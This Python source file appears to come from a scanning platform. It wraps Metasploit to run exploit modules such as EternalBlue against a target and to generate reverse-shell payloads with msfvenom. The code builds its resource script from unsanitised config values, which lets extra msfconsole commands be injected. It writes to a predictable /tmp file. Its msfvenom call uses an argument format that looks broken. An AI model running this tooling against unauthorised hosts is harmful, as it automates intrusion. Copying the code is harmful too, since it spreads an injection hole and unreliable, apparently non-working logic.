"""
Metasploit Framework integration
"""

import subprocess
import logging
import json
from typing import Dict, List, Any, Optional
from app.services.tool_runners.base_runner import BaseToolRunner

logger = logging.getLogger(__name__)


class MetasploitRunner(BaseToolRunner):
    """Metasploit Framework runner"""
    
    def __init__(self, scan_id: str):
        super().__init__(scan_id, "metasploit")
        self.msfconsole_path = "/usr/bin/msfconsole"
        self.resource_file = f"/tmp/msf_{scan_id}.rc"
    
    def validate_input(self, targets: List[str], config: Dict[str, Any] = None) -> bool:
        """Validate Metasploit input"""
        config = config or {}
        if not config.get('module'):
            return False
        return True
    
    def run(self, targets: List[str], config: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Run Metasploit module
        """
        config = config or {}
        module = config.get('module')  # e.g., exploit/windows/smb/ms17_010_eternalblue
        payload = config.get('payload')  # e.g., windows/x64/meterpreter/reverse_tcp
        lhost = config.get('lhost', '0.0.0.0')
        lport = config.get('lport', 4444)
        rhost = targets[0] if targets else config.get('rhost')
        
        if not rhost:
            raise ValueError("Target (rhost) required for Metasploit")
        
        # Create resource file
        resource_script = f"""
use {module}
set RHOSTS {rhost}
"""
        
        if payload:
            resource_script += f"set PAYLOAD {payload}\n"
            resource_script += f"set LHOST {lhost}\n"
            resource_script += f"set LPORT {lport}\n"
        
        # Add any additional options
        for key, value in config.get('options', {}).items():
            resource_script += f"set {key} {value}\n"
        
        resource_script += "run\n"
        resource_script += "exit\n"
        
        # Write resource file
        with open(self.resource_file, 'w') as f:
            f.write(resource_script)
        
        logger.info(f"Running Metasploit module: {module} against {rhost}")
        
        try:
            # Run msfconsole with resource file
            cmd = [self.msfconsole_path, '-r', self.resource_file, '-q']
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            stdout, stderr = process.communicate(timeout=300)  # 5 minute timeout
            
            if process.returncode != 0:
                logger.error(f"Metasploit failed: {stderr}")
                return {"error": stderr, "success": False}
            
            # Parse output
            parsed = self.parse_output(stdout)
            
            return {
                "success": True,
                "module": module,
                "target": rhost,
                "output": parsed,
                "raw_output": stdout
            }
            
        except subprocess.TimeoutExpired:
            process.kill()
            return {"error": "Metasploit execution timed out", "success": False}
        except Exception as e:
            logger.error(f"Metasploit execution error: {e}")
            return {"error": str(e), "success": False}
    
    def parse_output(self, output: str) -> Dict[str, Any]:
        """Parse Metasploit output"""
        results = {
            "sessions": [],
            "exploits": [],
            "vulnerabilities": [],
        }
        
        # Check for successful exploitation
        if "Meterpreter session" in output or "session opened" in output.lower():
            results["exploits"].append({
                "status": "success",
                "message": "Session opened"
            })
        
        # Check for vulnerabilities
        if "vulnerable" in output.lower() or "exploitable" in output.lower():
            results["vulnerabilities"].append({
                "status": "vulnerable",
                "message": "Target appears vulnerable"
            })
        
        return results
    
    def generate_payload(self, payload_type: str, lhost: str, lport: int, **options) -> Dict[str, Any]:
        """Generate a payload using msfvenom"""
        try:
            cmd = ['msfvenom', '-p', payload_type]
            cmd.extend(['LHOST', lhost])
            cmd.extend(['LPORT', str(lport)])
            
            for key, value in options.items():
                cmd.extend([key.upper(), str(value)])
            
            cmd.extend(['-f', 'raw'])
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            stdout, stderr = process.communicate()
            
            if process.returncode != 0:
                return {"error": stderr.decode(), "success": False}
            
            return {
                "success": True,
                "payload": stdout.hex(),
                "payload_type": payload_type,
                "size": len(stdout)
            }
        except Exception as e:
            logger.error(f"Payload generation failed: {e}")
            return {"error": str(e), "success": False}
    
    def list_modules(self, module_type: str = "exploit") -> List[str]:
        """List available Metasploit modules"""
        try:
            cmd = [self.msfconsole_path, '-q', '-x', f'search type:{module_type}; exit']
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            stdout, _ = process.communicate()
            
            modules = []
            for line in stdout.split('\n'):
                if module_type in line.lower():
                    parts = line.split()
                    if parts:
                        modules.append(parts[0])
            
            return modules
        except Exception as e:
            logger.error(f"Failed to list modules: {e}")
            return []
